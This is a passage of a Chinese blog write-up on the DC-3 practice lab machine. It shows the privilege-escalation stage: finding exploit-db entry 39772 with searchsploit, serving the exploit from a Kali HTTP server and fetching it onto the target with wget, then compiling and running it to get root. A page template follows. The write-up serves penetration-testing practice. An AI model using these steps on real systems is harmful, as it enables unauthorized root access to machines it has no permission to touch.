+<p>我们现在还没拿到root权限，根据靶机描述也可以知道，这里需要利用的属于系统漏洞，我们要通过系统来进行提权</p>
+<p>首先先确定当前系统的版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统信息</span><br><span class="line">tac /etc/issue</span><br><span class="line"></span><br><span class="line"># 版本信息</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122103224211.png"></p>
+<p>搜索相关漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122103414506.png"></p>
+<p>漏洞详情路径为，里面存在exp的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/39772.txt </span><br></pre></td></tr></table></figure>
+<p>漏洞利用如下</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104844657.png"></p>
+<p>exp地址如下</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122103648175.png"></p>
+<p>现在就需要把这个exp传到靶机中，我们首先下载exp到kali，然后kali开启http服务，再利用shell下载exp</p>
+<p>靶场的镜像没法用了，现在有个新的exp连接</p>
+<p>exp下载连接：https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip?ref_type=heads&amp;inline=false</p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104349675.png"></p>
+<p>kali开启http服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104544906.png"></p>
+<p>exp的下载地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.1.128:8888/%E6%A1%8C%E9%9D%A2/exploit.tar</span><br></pre></td></tr></table></figure>
+<p>回到我们的虚拟终端，利用wget命令下载该工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://172.18.1.128:8888/%E6%A1%8C%E9%9D%A2/exploit.tar</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104712166.png"></p>
+<p>解压该压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122104750143.png"></p>
+<p>根据漏洞利用方式，就是运行这两个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122105111460.png"></p>
+<p>提权成功！</p>
+<h1 id="查找flag">查找flag</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122105248656.png"></p>
+<p><img src="/2023/11/22/%E6%B8%97%E9%80%8FDC-3/image-20231122105300018.png"></p>
+<h1 id="总结">总结</h1>
+<ul>
+<li>joomla cms</li>
+<li>joomscan扫描器</li>
+<li>searchsploit漏洞搜索模块</li>
+<li>sqlmap进行sql注入</li>
+<li>John密码破解</li>
+<li>php反弹shell</li>
+<li>系统提权</li>
+<li>远程文件下载wget</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/16/%E6%B8%97%E9%80%8FDC-2/" rel="prev" title="渗透DC-2">
+      <i class="fa fa-chevron-left"></i> 渗透DC-2
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-number">4.2.</span> <span class="nav-text">密码破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.3.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">5.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E6%89%BEflag"><span class="nav-number">6.</span> <span class="nav-text">查找flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zzZxby"
+      src="/images/zzZ.jpg">
+  <p class="site-author-name" itemprop="name">zzZxby</p>
+  <div class="site-description" itemprop="description">看山是山，看水是水</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zzZxby</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">39k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:23</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    // window.MathJax = {
+    //   loader: {
+    //
+    //       load: ['[tex]/mhchem'],
+    //
+    //     source: {
+    //       '[tex]/amsCd': '[tex]/amscd',
+    //       '[tex]/AMScd': '[tex]/amscd'
+    //     }
+    //   },
+    //   tex: {
+    //     inlineMath: {'[+]': [['$', '$']]},
+    //
+    //       packages: {'[+]': ['mhchem']},
+    //
+    //     tags: 'ams'
+    //   },
+    //   options: {
+    //     renderActions: {
+    //       findScript: [10, doc => {
+    //         document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+    //           const display = !!node.type.match(/; *mode=display/);
+    //           const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+    //           const text = document.createTextNode('');
+    //           node.parentNode.replaceChild(text, node);
+    //           math.start = {node: text, delim: '', n: 0};
+    //           math.end = {node: text, delim: '', n: 0};
+    //           doc.math.push(math);
+    //         });
+    //       }, '', false],
+    //       insertedScript: [200, () => {
+    //         document.querySelectorAll('mjx-container').forEach(node => {
+    //           let target = node.parentNode;
+    //           if (target.nodeName.toLowerCase() === 'li') {
+    //             target.parentNode.classList.add('has-jax');
+    //           }
+    //         });
+    //       }, '', false]
+    //     }
+    //   }
+    // };
+    window.MathJax = {
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+        processEscapes: true
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@2.7.8/unpacked/MathJax.js?config=TeX-MML-AM_CHTML';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+    </div>
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+
+</body>
+</html>
